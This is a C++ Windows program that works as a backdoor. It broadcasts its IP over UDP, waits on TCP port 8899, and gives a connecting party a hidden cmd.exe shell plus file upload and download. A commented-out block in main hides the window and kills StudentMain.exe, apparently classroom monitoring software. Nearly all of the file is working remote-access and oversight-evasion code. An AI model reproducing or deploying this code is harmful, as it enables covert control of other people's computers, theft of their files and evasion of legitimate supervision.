#include <iostream>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <typeinfo>
#include <fstream>
#define BUFFER 1024

using namespace std;

const char* CMD_EXIT="exit";
const char* CMD_CMD="cmd";
const char* OK="OK";
const char* CMD_QUIT="quit";
const char* CMD_SENDFILE="send";
const char* CMD_COPY="copy";

WSADATA data;
SOCKET s,tcp,client;
SOCKADDR_IN server,cli;
bool waiting=true;
char n[1000005];
char WriteBuff[100005];
string ReadBuff;
char buf[BUFFER];
char FileBuf[1024];
//Copied from CSDN
HANDLE m_hChildInputWrite;
HANDLE m_hChildInputRead;
HANDLE m_hChildOutputWrite;
HANDLE m_hChildOutputRead;
PROCESS_INFORMATION m_cmdPI;
bool RunProcess( const string &process ) {
	SECURITY_ATTRIBUTES   sa;
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(sa);
	if( FALSE == ::CreatePipe(&m_hChildOutputRead, &m_hChildOutputWrite, &sa, 0) ) {
		return false;
	}
	if( FALSE == CreatePipe(&m_hChildInputRead, &m_hChildInputWrite, &sa, 0) ) {
		::CloseHandle(m_hChildOutputWrite);
		::CloseHandle(m_hChildOutputRead);
		::CloseHandle(m_hChildOutputWrite);
		::CloseHandle(m_hChildOutputRead);
		return false;
	}
	ZeroMemory(&m_cmdPI, sizeof(m_cmdPI));
	STARTUPINFO  si;
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = m_hChildInputRead;
	si.hStdOutput = m_hChildOutputWrite;
	si.hStdError = m_hChildOutputWrite;
	if( FALSE == ::CreateProcess(NULL, (LPSTR)(LPCTSTR) process.c_str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &m_cmdPI) ) {
		CloseHandle(m_hChildInputWrite);
		CloseHandle(m_hChildInputRead);
		CloseHandle(m_hChildOutputWrite);
		CloseHandle(m_hChildOutputRead);
		m_hChildInputWrite = NULL;
		m_hChildInputRead  = NULL;
		m_hChildOutputWrite= NULL;
		m_hChildOutputRead = NULL;
		ZeroMemory(&m_cmdPI, sizeof(m_cmdPI));
		return false;
	}
	return true;
}
bool CloseProcess() {
	::CloseHandle(m_hChildInputWrite);
	::CloseHandle(m_hChildInputRead);
	::CloseHandle(m_hChildOutputWrite);
	::CloseHandle(m_hChildOutputRead);
	m_hChildInputWrite = NULL;
	m_hChildInputRead  = NULL;
	m_hChildOutputWrite= NULL;
	m_hChildOutputRead = NULL;
	::TerminateProcess(m_cmdPI.hProcess, -1);
	::CloseHandle(m_cmdPI.hProcess);
	::CloseHandle(m_cmdPI.hThread);
}
bool GetOutput( const string &endStr, string &outstr ) {
	if( NULL == m_hChildOutputRead )
		return false;
	outstr = "";
	char buffer[4096] = {0};
	DWORD readBytes = 0;
	while(1) {
		if(FALSE == PeekNamedPipe( m_hChildOutputRead, buffer, sizeof(buffer) - 1, &readBytes, 0, NULL ) )
			return false;
		if(0 == readBytes ) {
			Sleep(200);
			continue;
		}
		readBytes = 0;
		if( ::ReadFile( m_hChildOutputRead, buffer, sizeof(buffer) - 1, &readBytes, NULL) ) {
			outstr.insert( outstr.end(), buffer, buffer + readBytes );
			size_t pos = outstr.rfind(endStr);
			if( string::npos == pos ) {
				continue;
			}
			if( pos == outstr.size() - endStr.size() ) {
				return true;
			}
		} else return false;
	}
	return false;
}
bool SetInput(const string &cmd) {
	if(m_hChildInputWrite==NULL)
		return "";
	string tmp = cmd + "\r\n";
	DWORD writeBytes = 0;
	if( FALSE == ::WriteFile( m_hChildInputWrite, tmp.c_str(), tmp.size(), &writeBytes, NULL ) )
		return false;
	return true;
}
HANDLE mFile;
unsigned long long FileSize;
char Recv[3];
void sendOK() {
	send(client,OK,strlen(OK),0);
}
void recvOK() {
	recv(client,Recv,3,0);
}
void sendFile() {
	sendOK();
	recv(client,n,sizeof(n),0);
	sendOK();
	mFile = CreateFile((LPSTR)(LPCTSTR) n,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	FileSize=GetFileSize(mFile,NULL);
	send(client,(char*)&FileSize,sizeof(unsigned long long)+1,0);
	recvOK();
	unsigned long long asd=0;
	DWORD readed;
	do {
		ReadFile(mFile,FileBuf,1024,&readed,NULL);
		send(client,FileBuf,readed,0);
		asd+=readed;
	} while (FileSize-asd);
	CloseHandle(mFile);
}
void recvFile() {
	DWORD FileLength;
	sendOK();
	recv(client,(char*)&FileSize,sizeof(unsigned long long)+1,0);
	sendOK();
	recv(client,n,sizeof(n),0);
	sendOK();
	mFile = CreateFile((LPSTR)(LPCTSTR) n,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	unsigned long long al=0;
	do {
		FileLength=recv(client,FileBuf,sizeof(FileBuf),0);
		WriteFile(mFile,FileBuf,FileLength,&FileLength,NULL);
		al+=FileLength;
	} while (FileSize-al);
	CloseHandle(mFile);
	send(client,OK,strlen(OK),0);
}
void cmdMode() {
	int leng;
	send(client,OK,strlen(OK),0);
	RunProcess("cmd.exe");
	if (!GetOutput(">",ReadBuff)) return;
	send(client,ReadBuff.c_str(),ReadBuff.length(),0);
	while (true) {
		fill(WriteBuff,WriteBuff+strlen(WriteBuff),'\0');
		recv(client,WriteBuff,sizeof(WriteBuff),0);
		strcat(WriteBuff,"\r\n");
		leng=strlen(WriteBuff);
		if (leng==2) {
			closesocket(tcp);
			waiting=true;
			return;
		}
		if (WriteBuff[0]=='e'&&WriteBuff[1]=='x'&&WriteBuff[2]=='i'&&WriteBuff[3]=='t') {
			SetInput(WriteBuff);
			return;
		}
		SetInput(WriteBuff);
		if (!GetOutput(">",ReadBuff)) return;
		send(client,ReadBuff.c_str(),ReadBuff.length(),0);
	}
}
DWORD WINAPI waitTCP(LPVOID args) {
	tcp=socket(AF_INET,SOCK_STREAM,0);
	bool rr=true;
	setsockopt(tcp, SOL_SOCKET, SO_REUSEADDR, (char*)&rr, sizeof(BOOL));
	if (tcp==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1);
	}
	server.sin_addr.S_un.S_addr = INADDR_ANY;
	server.sin_family = AF_INET;
	server.sin_port = htons(8899);
	bind(tcp,(SOCKADDR*)&server,sizeof(SOCKADDR));
	listen(tcp,1);
	int len=sizeof(SOCKADDR);
	client=accept(tcp,(SOCKADDR*)&server,&len);
	printf("Connected\n");
	waiting=false;
	int leng,find;
	while (true) {
		fill(buf,buf+strlen(buf),'\0');
		recv(client,buf,BUFFER-1,0);
		leng=strlen(buf);
		if (leng==0) {
			closesocket(tcp);
			waiting=true;
			return 0;
		}
		for (find=0; find<=leng; find++) if (buf[find]==':') break;
		fill(n,n+find,'\0');
		for (int i=0; i<find; i++) n[i]=buf[i];
		n[find]='\0';
		if (strcmp(n,CMD_EXIT)==0) {
			closesocket(tcp);
			waiting=true;
			return 0;
		} else if (strcmp(n,CMD_CMD)==0) {
			cmdMode();
			continue;
		} else if (strcmp(n,CMD_QUIT)==0) {
			closesocket(tcp);
			exit(0);
			return 0;
		} else if (strcmp(n,CMD_SENDFILE)==0) {
			recvFile();
			continue;
		} else if (strcmp(n,CMD_COPY)==0) {
			sendFile();
			continue;
		}
	}
}
void doOne() {
	system("cls");
	cout<<"Wait for Connection"<<endl;
	int ret;
	s = socket(AF_INET,SOCK_DGRAM,0);
	bool broad=true;
	setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char*)&broad, sizeof(BOOL));
	if (s==INVALID_SOCKET) {
		cout<<"Socket created failed, ErrorCode:"<<WSAGetLastError();
		WSACleanup();
		exit(1);
	}
	SOCKADDR_IN sin;
	int len=sizeof(SOCKADDR);
	ZeroMemory(buf,BUFFER);
	sin.sin_addr.S_un.S_addr = INADDR_BROADCAST;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8898);
	char local[256];
	if (gethostname(local, sizeof(local))==SOCKET_ERROR) {
		cout<<"Get ip error\n";
		exit(1);
	}
	HOSTENT* host=gethostbyname(local);
	if (host==NULL) {
		cout<<"Cannot get host ip"<<endl;
		exit(1);
	}
	in_addr addr;
	memcpy(&addr, host->h_addr_list[0], sizeof(in_addr));
	char* c=inet_ntoa(addr);
	CreateThread(NULL, 0, waitTCP, NULL, 0, 0);
	while (waiting) {
		sendto(s, c, strlen(c), 0, (sockaddr*)&sin, sizeof(sin));
		Sleep(500);
	}
	closesocket(s);
	while (!waiting) {}
}
int main() {
	/*ShowWindow(GetForegroundWindow(),false);
	ofstream bat;
	bat.open("C:\\A.bat");
	bat<<"ntsd -c q -pn StudentMain.exe"<<endl<<"exit"<<endl;
	bat.close();
	system("start C:\\A.bat");*/
	if (WSAStartup(MAKEWORD(2,2),&data)!=0) {
		cout<<"Start failed\n";
		exit(1);
	}
	while (true) doOne();
	return 0;
}
